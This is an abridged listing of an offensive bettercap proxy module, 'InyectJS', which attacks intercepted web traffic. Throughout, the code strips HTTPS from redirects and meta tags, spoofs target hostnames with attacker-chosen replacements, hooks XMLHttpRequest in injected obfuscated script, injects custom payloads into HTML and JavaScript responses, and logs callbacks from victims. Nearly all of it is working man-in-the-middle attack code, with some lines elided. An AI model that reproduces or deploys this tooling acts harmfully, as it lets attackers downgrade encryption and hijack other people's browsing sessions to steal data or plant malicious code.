    	...
    	"if (!{{session_id}}) {\n" + 
    		"var {{session_id}} = function() {\n" + 
				...
				"function obf_func_toWholeWildcardRegexp(obf_var_string) {" + 
					...
					"return new RegExp(\"^\" + obf_var_string + \"$\", \"ig\")" + 
				"}" + 
				"function obf_func_InyectJS(obf_host) {" + 
				...
				"function obf_func_attack_XMLHttpRequest() {" + 
					...
					"XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {" + 
						"for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {" + 
							"obf_var_host = obf_func_InyectJS(obf_var_url.replace(/^http[s]?:\\/\\/([^:/?#]+).*$/i, \"$1\"));" + 
...
function configure() {
	...
	env["InyectJS.ignore"]         ? ignore_hosts       = env["InyectJS.ignore"].replace(/\s/g, "").split(",")         : ignore_hosts       = [];
	env["InyectJS.targets"]        ? target_hosts       = env["InyectJS.targets"].replace(/\s/g, "").split(",")        : target_hosts       = [];
	env["InyectJS.replacements"]   ? replacement_hosts  = env["InyectJS.replacements"].replace(/\s/g, "").split(",")   : replacement_hosts  = [];
	env["InyectJS.blockscripts"]   ? block_script_hosts = env["InyectJS.blockscripts"].replace(/\s/g, "").split(",")   : block_script_hosts = [];
	env["InyectJS.payloads"]       ? custom_payloads    = env["InyectJS.payloads"].replace(/\s/g, "").split(",")       : custom_payloads    = [];
	env["InyectJS.obfuscate"]      ? obfuscate          = env["InyectJS.obfuscate"].replace(/\s/g, "").toLowerCase()   : obfuscate          = false;
	env["InyectJS.encode"]         ? encode             = env["InyectJS.encode"].replace(/\s/g, "").toLowerCase()      : encode             = false;

	// Validate caplet.
	target_hosts.length < replacement_hosts.length ? log_fatal(on_blue + "InyectJS" + reset + " Too many InyectJS.replacements (got " + replacement_hosts.length + ").") : ""
	target_hosts.length > replacement_hosts.length ? log_fatal(on_blue + "InyectJS" + reset + " Not enough InyectJS.replacements (got " + replacement_hosts.length + ").") : ""
	target_hosts.indexOf("*") != -1                 ? log_fatal(on_blue + "InyectJS" + reset + " Invalid InyectJS.targets value (got *).") : ""
	replacement_hosts.indexOf("*") != -1            ? log_fatal(on_blue + "InyectJS" + reset + " Invalid InyectJS.replacements value (got *).") : ""
	for (var i = 0; i < ignore_hosts.length; i++) {
		!ignore_hosts[i].match(/^(?:\*$|\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "InyectJS" + reset + " Invalid InyectJS.ignore value (got " + ignore_hosts[i] + ").") : ""
	}
	for (var i = 0; i < target_hosts.length; i++) {
		!target_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "InyectJS" + reset + " Invalid InyectJS.targets value (got " + target_hosts[i] + ").") : ""
	}
	for (var i = 0; i < replacement_hosts.length; i++) {
		!replacement_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "InyectJS" + reset + " Invalid InyectJS.replacements value (got " + replacement_hosts[i] + ").") : ""
	}
	for (var i = 0; i < block_script_hosts.length; i++) {
		!block_script_hosts[i].match(/^(?:\*\.[a-z]+$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "InyectJS" + reset + " Invalid InyectJS.blockscripts value (got " + block_script_hosts[i] + ").") : ""
	}
	if (obfuscate == "false") {
		obfuscate = false
	}
	...
	for (var a = 0; a < custom_payloads.length; a++) {
		if ( !custom_payloads[a].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ) {
			log_fatal(on_blue + "InyectJS" + reset + " Invalid InyectJS.payloads value (got " + custom_payloads[a] + ").")
		}
		...
		if ( !readFile(path) ) {
			log_error(on_blue + "InyectJS" + reset + " Could not read a path in InyectJS.payloads (got " + path + ").")
		} else {
	...
	for (var i = 0; i < target_hosts.length; i++) {
		...
		if ( !target.match(/^\*/) ) {
			if ( ssl_log.indexOf(target) == -1 ) {
				ssl_log.push(target)
				writeFile( env["InyectJS.log"], ssl_log.join("\n") )
				env["InyectJS.log"] ? log_debug(on_blue + "InyectJS" + reset + " Saved " + target + " to SSL log.") : ""
			}
		}
	}
}
...
function showModule() {
	...
	logStr += "\n"
	logStr += "    " + bold + "InyectJS.show" + reset + " : Show module info.\n"
	logStr += "\n"
	logStr += "  " + bold + "Caplet" + reset + "\n"
	logStr += "\n"
	logStr += "    " + yellow + "           InyectJS.log" + reset + " > " + ( env["InyectJS.log"] ? green + env["InyectJS.log"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "        InyectJS.ignore" + reset + " > " + ( env["InyectJS.ignore"] ? green + env["InyectJS.ignore"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "       InyectJS.targets" + reset + " > " + ( env["InyectJS.targets"] ? green + env["InyectJS.targets"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  InyectJS.replacements" + reset + " > " + ( env["InyectJS.replacements"] ? green + env["InyectJS.replacements"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  InyectJS.blockscripts" + reset + " > " + ( env["InyectJS.blockscripts"] ? green + env["InyectJS.blockscripts"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "     InyectJS.obfuscate" + reset + " > " + ( obfuscate ? green + "true" : red + "false" ) + reset + "\n"
	logStr += "    " + yellow + "        InyectJS.encode" + reset + " > " + ( encode ? green + "true" : red + "false" ) + reset + "\n"
	logStr += "    " + yellow + "InyectJS.payloads" + reset + " > "
	if ( env["InyectJS.payloads"] ) {
			list = env["InyectJS.payloads"].replace(/\s/g, "").split(",")
...
function onLoad() {
	...
	log_info(on_blue + "InyectJS" + reset + " Generating random variable names for this session ...")
	...
	log_info(on_blue + "InyectJS" + reset + " Reading SSL log ...")
	if ( !readFile( env["InyectJS.log"] ) ) {
		log_info(on_blue + "InyectJS" + reset + " No SSL log file found, creating one now ...")
		writeFile(env["InyectJS.log"], "")
	}
	ssl_log = readFile( env["InyectJS.log"] ).split("\n")

	log_info(on_blue + "InyectJS" + reset + " Reading caplet ...")
	configure()

	log_info(on_blue + "InyectJS" + reset + " Module loaded.")
	showModule()
}
...
/* Handle special callbacks */
	...
	if (req.Path == "/" + callback_path || req.Path == "/" + whitelist_path || req.Path == "/" + ssl_log_path) {
		...
		if (req.Path == "/" + ssl_log_path) {
			...
			log_debug(on_blue + "InyectJS" + reset + " Silent SSL log callback received from " + green + req.Client + reset + " for " + bold + queried_host + reset + ".")
			for (var i = 0; i < target_hosts.length; i++) {
				var regexp
				...
				if ( queried_host.match(regexp) ) {
					if ( ssl_log.indexOf(queried_host) == -1 ) {
						log_debug(on_blue + "InyectJS" + reset + " Learning HTTP response from " + queried_host + " ...")
		...
		if (req.Path == "/" + callback_path) {
			log_info(on_blue + "InyectJS" + reset + " Silent callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)

			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "InyectJS.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"
		...
		if (req.Path == "/" + whitelist_path) {
			log_info(on_blue + "InyectJS" + reset + " Silent, whitelisting callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)

			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "InyectJS.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
		...
		if (whitelist[req.Client]) {
			...
			for (var a = 0; a < whitelisted_hosts.length; a++) {
				...
				if ( req.Hostname.match(regexp) ) {
					...
					ignored = true
					log_info(on_blue + "InyectJS" + reset + " Redirecting " + green + req.Client + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
					break
				}
			}
		}
		...
		/* Patch Request */
			...
			for (var a = 0; a < target_hosts.length; a++) {
				...
				if ( req.Headers.match(regexp) ) {
					...
					log_debug(on_blue + "InyectJS" + reset + " Patched spoofed hostname(s) in request header(s).")
				}
				...
				if ( req.Hostname.match(regexp) ) {
					...
					req.Scheme   = "https"
					log_debug(on_blue + "InyectJS" + reset + " Patched spoofed hostname " + bold + spoofed_host + reset + " to " + bold + req.Hostname + reset + " and set scheme to HTTPS.")
				}
			}
			...
			for (var a = 0; a < ssl_log.length; a++) {
				...
				if ( req.Headers.match(regexp) ) {
					...
					log_debug(on_blue + "InyectJS" + reset + " Patched SSL of " + ssl_log[a] + " in request headers.")
				}
			}
			...
			if (req.Scheme != "https") {
				if ( ssl_log.indexOf(req.Hostname) > -1 ) {
					req.Scheme = "https"
					log_debug(on_blue + "InyectJS" + reset + " Found " + bold + req.Hostname + reset + " in SSL log. Upgraded scheme to HTTPS.")
				} else {
					for (var i = 0; i < target_hosts; i++) {
						...
						if ( req.Hostname.match(regexp) ) {
							req.Scheme = "https"
							log_debug(on_blue + "InyectJS" + reset + " Found " + bold + req.Hostname + reset + " in InyectJS.targets. Upgraded scheme to HTTPS.")
						}
					}
				}
			}
...
/* Remember HTTPS redirects */
	...
	if ( location.match(/^https:\/\//i) ) {
		...
		if ( ssl_log.indexOf(host) == -1 ) {
			ssl_log.push(host)
			writeFile( env["InyectJS.log"], ssl_log.join("\n") )
			log_debug(on_blue + "InyectJS" + reset + " Saved " + host + " to SSL log.")
		}
	}
...
/* Attack or ignore response */
	...
	if ( res.GetHeader("bettercap", "") == "ignore" ) {
		...
		ignored = true
		log_debug(on_blue + "InyectJS" + reset + " Ignored response from " + bold + req.Hostname + reset + ".")
	} else {
	...
	/* Attack meta tag redirection */
		...
		if ( res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")/ig) ) {
			...
			for (var a = 0; a < meta_tags.length; a++) {
				log_debug(on_blue + "InyectJS" + reset + " Found " + meta_tags.length + " meta tag(s) in the response body.")

				if ( meta_tags[a].match(/https:\/\//ig) ) {
					replacement = meta_tags[a].replace(/https:\/\//ig, "http://")
					res.Body.replace(meta_tags[a], replacement)
					log_debug(on_blue + "InyectJS" + reset + " Stripped meta tag(s) from SSL.")
				}
				...
				for (var b = 0; b < target_hosts.length; b++) {
					...
					if ( meta_tags[a].match(regexp) ) {
						...
						log_debug(on_blue + "InyectJS" + reset + " Hijacked meta tag by replacing " + bold + target_hosts[b] + reset + " with " + bold + replacement_hosts[b] + reset + ".")
					}
				}
			}
		}
	...
	/* JavaScript */
		...
		for (var i = 0; i < block_script_hosts.length; i++) {
			...
			if ( req.Hostname.match(regexp) ) {
				...
				log_debug(on_blue + "InyectJS" + reset + " Blocked script(s) from " + bold + req.Hostname + reset + ".")
				break
			}
		}
		...
		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head[^>]*?>/i) ) {
			...
			for ( var a = 0; a < Object.keys(custom_payloads).length; a++ ) {
				...
				if ( req.Hostname.match(regexp) ) {
					...
					log_debug(on_blue + "InyectJS" + reset + " Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
				}
			}
			...
			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
				...
				log_debug(on_blue + "InyectJS" + reset + " Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
				...
				log_debug(on_blue + "InyectJS" + reset + " Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
			}
		}
	...
	/* Response headers */
		...
		if (location != "") {
			...
			log_debug(on_blue + "InyectJS" + reset + " Stripped SSL from location header.")
		}
		...
		for (var a = 0; a < target_hosts.length; a++) {
			...
			if ( res.Headers.match(regexp) ) {
				...
				log_debug(on_blue + "InyectJS" + reset + " Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
			}
		}
